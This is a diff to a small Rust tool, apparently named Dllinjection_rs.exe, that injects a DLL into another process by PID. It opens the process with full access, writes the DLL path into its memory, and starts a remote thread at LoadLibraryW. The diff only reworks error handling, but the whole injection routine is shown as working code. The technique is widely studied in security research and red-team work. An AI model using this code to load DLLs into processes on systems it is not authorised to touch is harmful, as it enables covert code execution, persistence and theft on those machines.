@@ -12,27 +12,21 @@ use windows::{
     },
 };
 
-fn main() {
+fn main() -> Result<(), Box<dyn std::error::Error>> {
     unsafe {
-        let args: Vec<String> = std::env::args().collect();
+        let args = std::env::args().collect::<Vec<String>>();
         if args.len() != 3 {
-            println!(".\\Dllinjection_rs.exe <pid> <path>");
-            return;
+            eprintln!(".\\Dllinjection_rs.exe <pid> <path>");
+            return Ok(());
         }
 
-        let pid = args[1].parse::<u32>().unwrap_or_else(|_e| {
-            panic!("[!] PID error format");
-        });
+        let pid = args[1].parse::<u32>()?;
 
         let path = &args[2];
-        let dll: Vec<u16> = path.encode_utf16().collect();
+        let dll = path.encode_utf16().collect::<Vec<u16>>();
 
-        let proc_address = GetProcAddress(GetModuleHandleW(w!("Kernel32")).unwrap(), s!("LoadLibraryW"));
-
-        let hprocess = OpenProcess(PROCESS_ALL_ACCESS, false, pid).unwrap_or_else(|e| {
-            panic!("[!] OpenProcess Failed With Error: {e}");
-        });
-
+        let proc_address = GetProcAddress(GetModuleHandleW(w!("Kernel32"))?, s!("LoadLibraryW"));
+        let hprocess = OpenProcess(PROCESS_ALL_ACCESS, false, pid)?;
         let address = VirtualAllocEx(
             hprocess,
             None,
@@ -41,15 +35,18 @@ fn main() {
             PAGE_READWRITE,
         );
 
+        if address.is_null() {
+            eprintln!("Address is null");
+            return Ok(())
+        }
+
         WriteProcessMemory(
             hprocess,
             address,
-            dll.as_ptr() as _,
+            dll.as_ptr().cast(),
             dll.len() * size_of::<u16>(),
             None,
-        ).unwrap_or_else(|e| {
-            panic!("[!] WriteProcessMemory Failed With Error: {e}");
-        });
+        )?;
 
         let hthread = CreateRemoteThread(
             hprocess,
@@ -59,11 +56,11 @@ fn main() {
             Some(address),
             0,
             None,
-        ).unwrap_or_else(|e| {
-            panic!("[!] CreateRemoteThread Failed With Error: {e}");
-        });
+        )?;
 
-        CloseHandle(hprocess);
-        CloseHandle(hthread);
+        CloseHandle(hprocess)?;
+        CloseHandle(hthread)?;
     }
+
+    Ok(())
 }
